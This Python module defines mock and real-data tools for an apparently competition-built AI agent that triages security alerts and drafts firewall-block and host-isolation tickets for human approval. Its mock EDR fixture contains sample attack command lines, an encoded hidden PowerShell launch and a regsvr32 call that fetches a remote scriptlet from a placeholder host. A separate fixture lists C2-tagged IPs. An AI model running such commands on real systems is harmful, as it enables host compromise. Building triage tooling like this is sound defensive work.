"""ReAct 工具集（8 个工具）。

赛题原文对齐：
> "根据多源安全数据（流量、端点、日志），决策并调用各类安全工具
>   （如防火墙封禁、EDR 隔离），实现从发现威胁到处置闭环"

工具分类：
  - 数据查询类（5个）：fetch_endpoint_logs / fetch_network_flows /
                      check_threat_intel / query_similar_alerts /
                      search_attck_technique / lookup_cve
  - 处置建议类（2个）：suggest_block_ip / suggest_isolate_host

设计要点（方案 5.6 节 "Mock 数据要像真的"）：
  - 进程名用真实风格（powershell.exe / regsvr32.exe / mimikatz.exe）
  - IP 用真实公网/内网，不用 1.1.1.1 这种
  - 工具是有状态的：对真阳告警返回可疑证据，对假阳返回正常数据
    （基于查询参数与固定 Mock 证据夹具，不读取 alert_id 或评测标签）

所有工具统一签名：(alert_context: dict, **args) -> dict
  alert_context 含 alert_id / src_ip / dst_ip / rule_name / description 等
  让工具能根据告警上下文返回"相关"的数据。
"""

from __future__ import annotations

import json
import logging
from typing import Any, Callable

logger = logging.getLogger(__name__)

# ============================================================
# 工具元信息（供 react_decide prompt 注入"可选工具列表"）
# ============================================================

TOOL_CATALOG: list[dict[str, Any]] = [
    {
        "name": "inspect_alert_context",
        "description": "读取告警自身携带的原始检测器事件和邻近时间窗统计；AIT-ADS 样本应优先调用",
        "args": {},
    },
    {
        "name": "fetch_endpoint_logs",
        "description": "查询指定受影响主机的端点安全日志（EDR、audit、auth、syslog 等）",
        "args": {"host_ip": "要查询的主机 IP"},
    },
    {
        "name": "fetch_network_flows",
        "description": "查询与指定 IP 匹配的网络证据（可能是 NDR/NetFlow 或 Suricata 告警，须检查返回类型）",
        "args": {"host_ip": "主机 IP", "window_min": "时间窗口（分钟）"},
    },
    {
        "name": "check_threat_intel",
        "description": "查询 IP/域名/哈希的威胁情报信誉",
        "args": {"indicator": "IP / 域名 / 文件哈希"},
    },
    {
        "name": "query_similar_alerts",
        "description": "查询历史相似告警，判断是否首次出现",
        "args": {"rule_name": "规则名或关键词"},
    },
    {
        "name": "search_attck_technique",
        "description": "查询 ATT&CK 战术技术图谱匹配",
        "args": {"keyword": "关键词（如 powershell / smb / reverse shell）"},
    },
    {
        "name": "lookup_cve",
        "description": "查询 CVE 漏洞详情",
        "args": {"keyword": "产品名或漏洞关键词"},
    },
    {
        "name": "suggest_block_ip",
        "description": "【处置】生成封禁 IP 的建议工单（不执行）",
        "args": {"ip": "要封禁的 IP", "reason": "封禁理由"},
    },
    {
        "name": "suggest_isolate_host",
        "description": "【处置】生成隔离主机的建议工单（不执行）",
        "args": {"host_ip": "要隔离的主机 IP", "reason": "隔离理由"},
    },
]


# ============================================================
# 辅助：判断告警真伪（决定 Mock 数据返回方向）
# ============================================================


# 旧实现会用 TP/FP 告警 ID 前缀选择工具证据，导致评测标签泄漏。
# 该逻辑不再执行；Mock 工具改为只查询下面按可观察 IoC 建立的固定夹具。
_SUSPICIOUS_ENDPOINT_HOSTS = {"10.20.33.51"}
_SUSPICIOUS_FLOW_HOSTS = {"10.20.33.51"}


def inspect_alert_context(alert_ctx: dict) -> dict:
    """Return label-free evidence embedded by the dataset adapter.

    Unlike the demo fixtures below, this tool works for uploaded/AIT alerts and
    never consults evaluation labels.  It exposes detector-native evidence and
    temporal aggregation that was computed from neighbouring raw events.
    """
    payload = alert_ctx.get("raw_payload") or {}
    from app.data.cam_lds import evidence_for_alert

    external = evidence_for_alert(alert_ctx)
    if external:
        detector_event = external.get("detector_event") or {}
        endpoint_targets = external.get("endpoint_targets") or []
        network_targets = external.get("network_targets") or []
        return {
            "data_source": "detector_event_store",
            "detector": payload.get("detector"),
            "event": detector_event,
            "detector_events": external.get("detector_events") or [detector_event],
            "coverage": external.get("coverage", {}),
            "primary_host": external.get("primary_host"),
            "primary_host_ip": external.get("primary_host_ip"),
            "query_targets": {
                "endpoint": endpoint_targets,
                "network_ips": network_targets,
            },
            "recommended_queries": {
                "fetch_endpoint_logs": (
                    {"host_ip": endpoint_targets[0]["ip"]} if endpoint_targets else None
                ),
                "fetch_network_flows": (
                    {"host_ip": network_targets[0], "window_min": 30}
                    if network_targets else None
                ),
            },
            "status": "ok",
            "source_available": True,
            "verdict": "已取得检测器原始告警及可用证据源概况；该结果不包含评测标签",
        }
    temporal = payload.get("temporal_context")
    evidence = {
        "data_source": "embedded_detector_context",
        "dataset": payload.get("dataset"),
        "detector": payload.get("detector"),
        "event": payload.get("event") or alert_ctx.get("description"),
        "observable_ips": payload.get("observable_ips", []),
        "rule_level": payload.get("rule_level"),
        "rule_groups": payload.get("rule_groups", []),
        "temporal_context": temporal,
    }
    if temporal:
        evidence["status"] = "ok"
        evidence["verdict"] = (
            "已取得该告警前后时间窗内的真实检测器统计；请结合频率、同规则重复数和原始事件研判"
        )
    else:
        evidence["status"] = "limited"
        evidence["verdict"] = "只有告警自身的原始检测器事件，没有邻近时间窗统计"
    return evidence


# ============================================================
# 内置知识库（跳过 RAG 后用关键词检索的简表）
# ============================================================

# 常用 ATT&CK 战术（企业矩阵高频技术）
_ATTCK_TECHNIQUES = [
    {"id": "T1059.001", "tactic": "执行", "name": "PowerShell", "desc": "滥用 PowerShell 执行命令，常见于钓鱼宏落地"},
    {"id": "T1071.001", "tactic": "命令与控制", "name": "Web 协议", "desc": "通过 HTTP/HTTPS 进行 C2 通信"},
    {"id": "T1021.002", "tactic": "横向移动", "name": "SMB/Windows 管理共享", "desc": "通过 SMB Admin$ 横向，PsExec 特征"},
    {"id": "T1218.010", "tactic": "防御规避", "name": "Regsvr32", "desc": "LOLBin，regsvr32 远程脚本执行"},
    {"id": "T1190", "tactic": "初始访问", "name": "利用面向公众的应用", "desc": "SQL 注入、RCE 漏洞利用"},
    {"id": "T1110.001", "tactic": "凭据访问", "name": "密码猜测", "desc": "暴力破解登录凭据"},
    {"id": "T1055", "tactic": "防御规避", "name": "进程注入", "desc": "注入到合法进程"},
    {"id": "T1003", "tactic": "凭据访问", "name": "操作系统凭据转储", "desc": "LSASS / mimikatz"},
    {"id": "T1566", "tactic": "初始访问", "name": "钓鱼", "desc": "鱼叉式钓鱼附件/链接"},
    {"id": "T1570", "tactic": "横向移动", "name": "使用替代身份验证材料", "desc": "横向移动"},
    {"id": "T1041", "tactic": "渗出", "name": "C2 通道渗出", "desc": "通过 C2 通道外传数据"},
    {"id": "T1486", "tactic": "影响", "name": "加密数据以勒索", "desc": "勒索软件加密"},
]

# 高危 CVE 简表
_CVE_DB = [
    {"id": "CVE-2024-3094", "product": "XZ Utils", "cvss": 10.0, "desc": "XZ 后门，供应链攻击影响 SSH"},
    {"id": "CVE-2023-23397", "product": "Microsoft Outlook", "cvss": 9.8, "desc": "Outlook 权限提升，0-click"},
    {"id": "CVE-2024-21413", "product": "Microsoft Outlook", "cvss": 9.8, "desc": "Outlook 远程代码执行"},
    {"id": "CVE-2023-34362", "product": "MOVEit Transfer", "cvss": 9.8, "desc": "SQL 注入导致数据泄露"},
    {"id": "CVE-2024-21887", "product": "Ivanti Connect Secure", "cvss": 9.1, "desc": "命令注入"},
    {"id": "CVE-2023-46604", "product": "Apache ActiveMQ", "cvss": 10.0, "desc": "RCE 反序列化"},
    {"id": "CVE-2024-6387", "product": "OpenSSH", "cvss": 8.1, "desc": "regreSSHion，sshd RCE"},
    {"id": "CVE-2023-22515", "product": "Atlassian Confluence", "cvss": 10.0, "desc": "权限提升"},
]

# 已知恶意 IP（简化版威胁情报）
_MALICIOUS_IPS = {
    "185.220.101.34": {"tag": "C2/Botnet", "source": "Tor exit + 暗网论坛"},
    "45.137.21.9": {"tag": "C2/Phishing", "source": "钓鱼基础设施"},
    "91.219.236.7": {"tag": "Scanner", "source": "全网扫描器"},
    "193.27.228.142": {"tag": "C2/Emotet", "source": "Emotet 僵尸网络"},
    "146.70.124.55": {"tag": "C2/Cobalt Strike", "source": "CS 服务器"},
    "81.17.30.158": {"tag": "C2/QakBot", "source": "QakBot 僵尸网络"},
}


# ============================================================
# 数据查询类工具
# ============================================================


def fetch_endpoint_logs(alert_ctx: dict, host_ip: str) -> dict:
    """查询指定主机的端点进程日志（EDR 数据源）。"""
    payload = alert_ctx.get("raw_payload") or {}
    from app.data.cam_lds import evidence_for_alert

    external = evidence_for_alert(alert_ctx)
    if external:
        records = external.get("endpoint_logs") or []
        primary_ip = external.get("primary_host_ip")
        targets = external.get("endpoint_targets") or []
        matched_target = next(
            (item for item in targets if item.get("ip") == host_ip), None
        )
        if targets and not matched_target:
            return {
                "data_source": "cam_lds_endpoint_logs",
                "host": host_ip,
                "primary_host": external.get("primary_host"),
                "primary_host_ip": primary_ip,
                "status": "no_records",
                "source_available": True,
                "records": [],
                "available_targets": targets,
                "verdict": "该 IP 不在案例的端点证据目标中；请使用 inspect_alert_context 返回的 recommended_queries",
            }
        if matched_target:
            records = [
                item for item in records if item.get("host") == matched_target.get("host")
            ]
        if not records:
            return {
                "data_source": "cam_lds_endpoint_logs",
                "host": host_ip,
                "status": "no_records",
                "source_available": True,
                "records": [],
                "verdict": "该案例没有可用的端点日志记录",
            }
        sources: dict[str, int] = {}
        for record in records:
            name = str(record.get("source") or "unknown")
            sources[name] = sources.get(name, 0) + 1
        return {
            "data_source": "cam_lds_endpoint_logs",
            "host": host_ip,
            "primary_host": external.get("primary_host"),
            "primary_host_ip": primary_ip,
            "matched_target": matched_target,
            "correlation_scope": (
                "exact_host" if matched_target else "attack_step_time_window"
            ),
            "source_available": True,
            "status": "ok",
            "record_count": len(records),
            "source_counts": sources,
            "records": records[:80],
            "truncated": len(records) > 80,
            "verdict": "已返回攻击步骤时间窗内采集的真实主机日志；需根据具体记录判断是否支持攻击假设",
        }
    if payload.get("dataset") == "AIT-ADS":
        return {
            "data_source": "edr_unavailable_for_ait_ads",
            "host": host_ip,
            "status": "no_records",
            "source_available": False,
            "verdict": "当前 AIT-ADS 适配数据不包含独立 EDR 进程日志；未返回重复的检测器上下文",
        }
    if host_ip in _SUSPICIOUS_ENDPOINT_HOSTS:
        return {
            "data_source": "mock_edr_fixture",
            "host": host_ip,
            "log_count": 47,
            "suspicious_processes": [
                {
                    "name": "powershell.exe",
                    "pid": 4892,
                    "parent": "WINWORD.EXE",
                    "parent_pid": 3120,
                    "cmdline": "powershell -nop -w hidden -enc SQBFAFgA...",
                    "user": alert_ctx.get("description", "").split("属主")[0] if "属主" in alert_ctx.get("description", "") else "finance_user_03",
                },
                {
                    "name": "regsvr32.exe",
                    "pid": 5021,
                    "parent": "powershell.exe",
                    "cmdline": "regsvr32 /s /u /i:https://malicious.example/scrobj.dll",
                },
            ],
            "verdict": "高度可疑：办公软件启动编码 PowerShell，符合钓鱼宏落地特征",
        }
    if host_ip == "10.20.30.5":
        return {
            "data_source": "mock_edr_fixture",
            "host": host_ip,
            "log_count": 12,
            "suspicious_processes": [],
            "normal_processes": [
                {"name": "nightly-monitor.exe", "pid": 1820, "parent": "services.exe",
                 "cmdline": "C:\\Scripts\\nightly-monitor.exe --target=" + host_ip},
                {"name": "chrome.exe", "pid": 2240, "parent": "explorer.exe"},
            ],
            "verdict": "未见可疑进程，监控脚本特征明显",
        }
    return {
        "data_source": "mock_edr_fixture",
        "host": host_ip,
        "log_count": 0,
        "suspicious_processes": [],
        "normal_processes": [],
        "status": "no_records",
        "verdict": "Mock EDR 中没有该主机记录，不能据此判断真伪",
    }


def fetch_network_flows(alert_ctx: dict, host_ip: str, window_min: int = 30) -> dict:
    """查询网络流量历史（NDR/NetFlow 数据源）。"""
    payload = alert_ctx.get("raw_payload") or {}
    from app.data.cam_lds import evidence_for_alert

    external = evidence_for_alert(alert_ctx)
    if external:
        all_alerts = external.get("network_alerts") or []
        alerts = [
            item for item in all_alerts
            if host_ip in {item.get("src_ip"), item.get("dst_ip")}
        ]
        if not alerts:
            return {
                "data_source": "cam_lds_suricata_fast",
                "host": host_ip,
                "window_min": window_min,
                "status": "no_records",
                "source_available": True,
                "netflow_available": False,
                "network_alerts": [],
                "available_targets": external.get("network_targets") or [],
                "verdict": "filtered 版中没有与该查询 IP 匹配的 Suricata 网络告警；这不等于网络行为正常",
            }
        return {
            "data_source": "cam_lds_suricata_fast",
            "host": host_ip,
            "window_min": window_min,
            "status": "ok",
            "source_available": True,
            "netflow_available": False,
            "network_evidence_kind": "suricata_fast_alerts",
            "alert_count": len(alerts),
            "network_alerts": alerts[:60],
            "truncated": len(alerts) > 60,
            "verdict": "已返回真实 Suricata fast.log 告警；filtered 版不含完整 NetFlow，不能据此推断流量基线",
        }
    if payload.get("dataset") == "AIT-ADS":
        return {
            "data_source": "netflow_unavailable_for_ait_ads",
            "host": host_ip,
            "window_min": window_min,
            "status": "no_records",
            "source_available": False,
            "verdict": "当前 AIT-ADS 适配数据不包含独立 NetFlow；未返回重复的检测器上下文",
        }
    dst_ip = alert_ctx.get("dst_ip", "未知")
    if host_ip in _SUSPICIOUS_FLOW_HOSTS and dst_ip in _MALICIOUS_IPS:
        return {
            "data_source": "mock_netflow_fixture",
            "host": host_ip,
            "window_min": window_min,
            "flow_count": 23,
            "anomalies": [
                {"type": "beacon", "desc": f"周期性外连 {dst_ip}:4444，间隔固定 60s",
                 "attck": "T1071.001"},
                {"type": "data_exfil", "desc": f"外传流量 145MB 到 {dst_ip}",
                 "attck": "T1041"},
            ],
            "verdict": "信标行为 + 数据外传，强烈 C2 特征",
        }
    if host_ip == "10.20.30.5":
        return {
            "data_source": "mock_netflow_fixture",
            "host": host_ip,
            "window_min": window_min,
            "flow_count": 8,
            "anomalies": [],
            "normal_flows": [
                {"type": "health_check", "desc": f"对 {dst_ip} 单次连接后 RST"},
            ],
            "verdict": "流量模式正常，符合健康检查特征",
        }
    return {
        "data_source": "mock_netflow_fixture",
        "host": host_ip,
        "window_min": window_min,
        "flow_count": 0,
        "anomalies": [],
        "normal_flows": [],
        "status": "no_records",
        "verdict": "Mock NetFlow 中没有该主机记录，不能据此判断真伪",
    }


def check_threat_intel(alert_ctx: dict, indicator: str) -> dict:
    """查询 IP/域名/哈希的威胁情报信誉。"""
    if (alert_ctx.get("raw_payload") or {}).get("dataset") == "AIT-ADS":
        return {
            "indicator": indicator,
            "malicious": None,
            "tags": [],
            "status": "no_records",
            "source_available": False,
            "verdict": "AIT-ADS 评测未连接实时威胁情报源，不能使用演示夹具生成情报结论",
        }
    info = _MALICIOUS_IPS.get(indicator)
    if info:
        return {
            "indicator": indicator,
            "malicious": True,
            "tags": [info["tag"]],
            "source": info["source"],
            "confidence": 0.95,
            "verdict": f"命中威胁情报：{info['tag']}（{info['source']}）",
        }
    # 未命中只表示“本地情报源没有记录”，不能反推该指标安全。
    return {
        "indicator": indicator,
        "malicious": None,
        "tags": [],
        "status": "no_records",
        "verdict": f"{indicator} 未在当前威胁情报库中命中，结论仍为未知",
    }


def query_similar_alerts(alert_ctx: dict, rule_name: str) -> dict:
    """查询历史相似告警，判断是否首次出现。"""
    if (alert_ctx.get("raw_payload") or {}).get("dataset") == "AIT-ADS":
        return {
            "data_source": "history_unavailable_for_ait_ads",
            "rule": rule_name,
            "history_count_30d": 0,
            "related_incidents": [],
            "status": "no_records",
            "source_available": False,
            "verdict": "AIT-ADS 评测未连接独立历史告警库，不能使用演示夹具生成相似案例",
        }
    if alert_ctx.get("dst_ip") in _MALICIOUS_IPS:
        return {
            "data_source": "mock_history_fixture",
            "rule": rule_name,
            "history_count_30d": 1,
            "first_seen": True,
            "related_incidents": [
                {"id": "INC-2026-0312", "severity": "high",
                 "summary": "同类 C2 外连，已确认攻击"},
            ],
            "verdict": "近 30 天首次出现，历史同类均确认为真实攻击",
        }
    if rule_name.lower() == "possible port scan":
        return {
            "data_source": "mock_history_fixture",
            "rule": rule_name,
            "history_count_30d": 187,
            "first_seen": False,
            "verdict": "历史高频出现（187 次），均为已确认的定时任务误报",
        }
    return {
        "data_source": "mock_history_fixture",
        "rule": rule_name,
        "history_count_30d": 0,
        "related_incidents": [],
        "status": "no_records",
        "verdict": "Mock 历史库中无匹配记录，不能据此判断真伪",
    }


def search_attck_technique(alert_ctx: dict, keyword: str) -> dict:
    """查询 ATT&CK 战术技术匹配（跳过 RAG，用内置简表 + LLM 自身知识）。"""
    kw = keyword.lower()
    matches = [
        t for t in _ATTCK_TECHNIQUES
        if kw in t["name"].lower() or kw in t["desc"].lower() or kw in t["tactic"]
    ]
    return {
        "keyword": keyword,
        "matches": matches[:5],  # 最多返回 5 条
        "total": len(matches),
        "note": "（基于内置 ATT&CK 简表 + LLM 内置知识；如需完整图谱需接入向量库）",
    }


def lookup_cve(alert_ctx: dict, keyword: str) -> dict:
    """查询 CVE 漏洞详情（跳过 RAG，用内置简表）。"""
    kw = keyword.lower()
    matches = [
        c for c in _CVE_DB
        if kw in c["product"].lower() or kw in c["desc"].lower() or kw in c["id"].lower()
    ]
    return {
        "keyword": keyword,
        "matches": matches[:3],
        "total": len(matches),
    }


# ============================================================
# 处置建议类工具（生成建议，不执行）
# ============================================================


def suggest_block_ip(alert_ctx: dict, ip: str, reason: str = "") -> dict:
    """生成封禁 IP 的建议工单（不执行真实封禁）。"""
    return {
        "action": "block_ip",
        "target": ip,
        "reason": reason or f"告警 {alert_ctx.get('alert_id')} 判定为真阳",
        "ticket_id": f"BLK-{alert_ctx.get('alert_id', 'XXXX')}-{ip.split('.')[-1]}",
        "executed": False,
        "note": "建议工单已生成，等待人工确认后由防火墙执行",
    }


def suggest_isolate_host(alert_ctx: dict, host_ip: str, reason: str = "") -> dict:
    """生成隔离主机的建议工单（不执行真实隔离）。"""
    return {
        "action": "isolate_host",
        "target": host_ip,
        "reason": reason or f"告警 {alert_ctx.get('alert_id')} 判定为真阳，疑似失陷",
        "ticket_id": f"ISO-{alert_ctx.get('alert_id', 'XXXX')}-{host_ip.split('.')[-1]}",
        "executed": False,
        "note": "建议工单已生成，等待人工确认后由 EDR 执行隔离",
    }


# ============================================================
# 工具分发表（tool_executor 节点用）
# ============================================================

RAW_TOOL_REGISTRY: dict[str, Callable[..., dict]] = {
    "inspect_alert_context": inspect_alert_context,
    "fetch_endpoint_logs": fetch_endpoint_logs,
    "fetch_network_flows": fetch_network_flows,
    "check_threat_intel": check_threat_intel,
    "query_similar_alerts": query_similar_alerts,
    "search_attck_technique": search_attck_technique,
    "lookup_cve": lookup_cve,
    "suggest_block_ip": suggest_block_ip,
    "suggest_isolate_host": suggest_isolate_host,
}


# 第二阶段：保留上面的原始 Python 工具实现，通过统一异步协议注册。
from app.agent.tooling import (  # noqa: E402  (registry belongs after functions)
    ControlledToolExecutor,
    ExecutionPolicy,
    FunctionAgentTool,
    ToolContext,
    ToolRegistry,
)


_TOOL_SOURCES = {
    "inspect_alert_context": "embedded_detector_context",
    "fetch_endpoint_logs": "endpoint_telemetry",
    "fetch_network_flows": "network_telemetry",
    "check_threat_intel": "threat_intelligence",
    "query_similar_alerts": "alert_history",
    "search_attck_technique": "mitre_attck",
    "lookup_cve": "cve_catalog",
    "suggest_block_ip": "firewall_workflow",
    "suggest_isolate_host": "edr_workflow",
}

_TOOL_REQUIRED_ARGUMENTS = {
    "inspect_alert_context": (),
    "fetch_endpoint_logs": ("host_ip",),
    "fetch_network_flows": ("host_ip",),
    "check_threat_intel": ("indicator",),
    "query_similar_alerts": ("rule_name",),
    "search_attck_technique": ("keyword",),
    "lookup_cve": ("keyword",),
    "suggest_block_ip": ("ip",),
    "suggest_isolate_host": ("host_ip",),
}

TOOL_REGISTRY = ToolRegistry()
for _meta in TOOL_CATALOG:
    _name = _meta["name"]
    TOOL_REGISTRY.register(
        FunctionAgentTool(
            name=_name,
            description=_meta["description"],
            source=_TOOL_SOURCES[_name],
            function=RAW_TOOL_REGISTRY[_name],
            required_arguments=_TOOL_REQUIRED_ARGUMENTS[_name],
        )
    )


DEFAULT_TOOL_EXECUTOR = ControlledToolExecutor(
    TOOL_REGISTRY, ExecutionPolicy()
)


def execute_tool(tool_name: str, alert_ctx: dict, args: dict) -> dict:
    """统一、受控的工具执行入口（保留同步调用兼容层）。

    参数：
        tool_name: 工具名（必须在 TOOL_REGISTRY 中）
        alert_ctx: 告警上下文 dict（所有工具都接收）
        args: 工具参数 dict

    返回：标准 ToolResult dict。原始工具数据位于 evidence[].data。
    """
    return DEFAULT_TOOL_EXECUTOR.execute_sync(
        tool_name,
        args,
        ToolContext(alert=alert_ctx),
    ).model_dump(mode="json")


def format_tool_catalog_for_prompt() -> str:
    """把工具目录格式化成 prompt 文本（供 react_decide prompt 用）。"""
    lines = []
    for t in TOOL_CATALOG:
        args_str = ", ".join(f"{k}: {v}" for k, v in t["args"].items())
        lines.append(f"- {t['name']}({args_str}): {t['description']}")
    return "\n".join(lines)
